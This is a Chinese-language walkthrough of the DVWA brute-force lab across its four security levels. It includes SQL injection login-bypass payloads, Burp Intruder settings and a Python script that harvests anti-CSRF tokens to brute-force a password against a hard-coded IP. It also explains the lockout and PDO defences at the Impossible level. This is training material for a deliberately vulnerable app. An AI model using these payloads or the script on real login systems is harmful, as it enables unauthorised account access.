---
title: DVWA-Brute Force
url: https://buaq.net/go-144636.html
source: unSafe.sh - 不安全
date: 2023-01-09
fetch_date: 2025-10-04T03:20:41.772122
---

# DVWA-Brute Force

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/b2ce852d34798e2e9ca35c387d83916a.jpg)

DVWA-Brute Force

1.Brute Force(Low)相关的代码分析if( isset( $\_GET[ 'Login' ] ) ) { // Get username
*2023-1-8 16:31:42
Author: [xz.aliyun.com(查看原文)](/jump-144636.htm)
阅读量:24
收藏*

---

## 1.Brute Force(Low)

相关的代码分析

```
if( isset( $_GET[ 'Login' ] ) ) {
    // Get username
    $user = $_GET[ 'username' ];

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
```

可以看到，服务器只是通过 isset( $\_GET[ 'Login' ]) 来判断 参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。

第一种方法，用burp的intruder模块爆破

加标识符

![](https://img-blog.csdnimg.cn/a25d3ae14a6a429890fb8cfbf8167ae4.png)

设置payload

![](https://img-blog.csdnimg.cn/f62a532d69564625bc3fd721f9a06969.png)

设置线程，并开始爆破

![](https://img-blog.csdnimg.cn/d163933097e546069257ea00cd39c1fd.png)

查看返回信息中，长度不同的，再看返回状态，爆破成功，账号：admin 密码：password

![](https://img-blog.csdnimg.cn/13fbc522444541c598fbea3f6b537a50.png)

第二种方法，使用SQL注入

账号输入admin'发现报错

![](https://img-blog.csdnimg.cn/8d4ce02e41f44001a3934320d6b15a15.png)

在用户名处注入语句，密码处为空

admin' or '1'='1或者admin' #

![](https://img-blog.csdnimg.cn/2b2623e4aa1e45118bd232a14fc07de0.png)

## 2.Brute Force(Medium)

相关的代码分析

![](https://img-blog.csdnimg.cn/2540f43dbdac47598359b52e73daa379.png)

相比Low级别的代码，Medium级别的代码主要增加了mysql\_real\_escape\_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，说基本上是因为查到说 MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql\_real\_escape\_string 对单引号的转义（因实验环境的MySQL版本较新，所以并未做相应验证）；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制（登录错误的sleep(2)实在算不上）。

虽然sql注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样，这里就不赘述了。

## 3.Brute Force(High)

相关代码分析

![](https://img-blog.csdnimg.cn/9dedb44ce0204d14a51a4aed19d3a6de.png)

High级别的代码加入了Token，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user\_token。

![](https://img-blog.csdnimg.cn/00c49bcb6c154b31a4b4d1f69386526f.png)

每次次服务器返回的登陆页面中都会包含一个随机的user\_token的值，用户每次登录时都要将user\_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。

![](https://img-blog.csdnimg.cn/03a6b2f368b94600946503599cea8cb0.png)

同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql\_real\_escape\_string对参数username、password进行过滤、转义，进一步抵御sql注入。

![](https://img-blog.csdnimg.cn/324f183ca4f7456886b4e9bd0ced0523.png)

第一种方法，由于加入了Anti-CSRFtoken预防无脑爆破，存在user\_token时的登录流程为:

![](https://img-blog.csdnimg.cn/f9aca8ac630040bd85ed9b4a26adade3.png)

简单用python写个脚本。

下面的脚本（python 3.7），用户名为admin，对password参数进行爆破并打印结果，仅供各位参考。

```
# !/usr/bin/env python
# -*- coding: utf-8 -*-
# @File  : brute_force.py
# @Author: ShenHao
# @Contact : [email protected]
# @Date  : 20-2-4下午4:26
# @Desc  : 脚本爆破带token的web网站

from bs4 import BeautifulSoup
import requests

header = {
    'Host': '43.247.91.228:81',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://43.247.91.228:81/vulnerabilities/brute/index.php',
    'Cookie': 'security=high; PHPSESSID=lksl77ja4uiqqogplk4fl1po6u',
    'DNT': '1',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

login_header = {
    'Host': '43.247.91.228:81',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Cookie': 'security=high; PHPSESSID=lksl77ja4uiqqogplk4fl1po6u',
    'DNT': '1',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

url = "http://43.247.91.228:81/vulnerabilities/brute/index.php"
login_url = r'http://43.247.91.228:81/login.php'

# 获取主界面的token
def get_login_token(requrl, header):
    response = requests.get(url=requrl, headers=header)
    data = response.text
    # print('\t', len(data))
    soup = BeautifulSoup(data, "html.parser")
    user_token = soup.select('form[action] > input[name]')[0].get('value')  # get the user_token
    return user_token

# 获取爆破界面的token
def get_target_token(requrl, header):
    response = requests.get(url=requrl, headers=header)
    data = response.text
    print('\t', len(data))
    # print(data)
    soup = BeautifulSoup(data, "html.parser")
    # user_token = soup.select('form[action] > input[type]')  # get the user_token
    user_token = soup.find_all('input')[3].get('value')  # get the user_token
    # print(user_token)
    return user_token

# 先登录主界面
login_token = get_login_token(login_url, login_header)
requests.post(url=login_url,
              headers=login_header,
              data={'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': login_token})

# 进入目标界面
user_token = get_target_token(url, header)
i = 0
for line in open("password.txt"):
    requrl = "http://43.247.91.228:81/vulnerabilities/brute/index.php" + "?username=admin&password=" + line.strip() + "&Login=Login&user_token=" + user_token
    print(i, '\tadmin\t', line.strip(), end='\t')
    user_token = get_target_token(requrl, header)
    i += 1

print('Task Done!')
```

![](https://img-blog.csdnimg.cn/a0d01d58b314416caf305e247df24b82.png)

对比结果看到，密码为password时返回的长度不太一样，手工验证，登录成功，爆破完成。

第二种方法，用burp爆破，具体设置如下：

选择pitchfork进行爆破，添加密码和token变量

![](https://img-blog.csdnimg.cn/8d9c8862d05a4c239370a0a466753dec.png)

因为token值是单次传递的，所以线程数改为1

![](https://img-blog.csdnimg.cn/2127d7ce66354d6cb072e06f62d3b763.png)

在GREP-Extract中获取响应包，从中提取参数。选中token值，这个时候工具会自动编辑规则，复制token值备用。点击ok。

![](https://img-blog.csdnimg.cn/596ce27f34314a5ba78beb1ca6867d83.png)

在页面最底部找到always选项

![](https://img-blog.csdnimg.cn/1261eba998e144339943c231746d5fb6.png)

回到payloads模块，正常添加第一个变量密码的字典

![](https://img-blog.csdnimg.cn/128641de8f7b4ec09f67d625898fe599.png)

第二个变量选择递归搜索(Recursive grep)

![](https://img-blog.csdnimg.cn/1016cc4c3ab34addbdcbe9efbaeb743e.png)

查看返回信息中，长度不同的，再看返回状态，爆破成功，账号：admin 密码：password

![](https://img-blog.csdnimg.cn/c13fcb7d9b134e89a1adb671b3e53e07.png)

## 4.Brute Force(Impossible)

相关的代码分析

![](https://img-blog.csdnimg.cn/8fd32bace666427e893ac596e1baf047.png)

可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。

同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。

文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。

免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。

转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。

博客:

<https://rdyx0.github.io/>

先知社区：

<https://xz.aliyun.com/u/37846>

CSDN:

<https://blog.csdn.net/weixin_48899364?type=blog>

公众号：

<https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg5NTU2NjA1Mw==&action=getalbum&album_id=1696286248027357190&scene=173&from_msgid=2247485408&from_itemidx=1&count=3&nolastread=1#wechat_redirect>

FreeBuf：

<https://www.freebuf.com/author/%E5%9B%BD%E6%9C%8D%E6%9C%80%E5%BC%BA%E6%B8%97%E9%80%8F%E6%8E%8C%E6%8E%A7%E8%80%85>

文章来源: https://xz.aliyun.com/t/12014
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)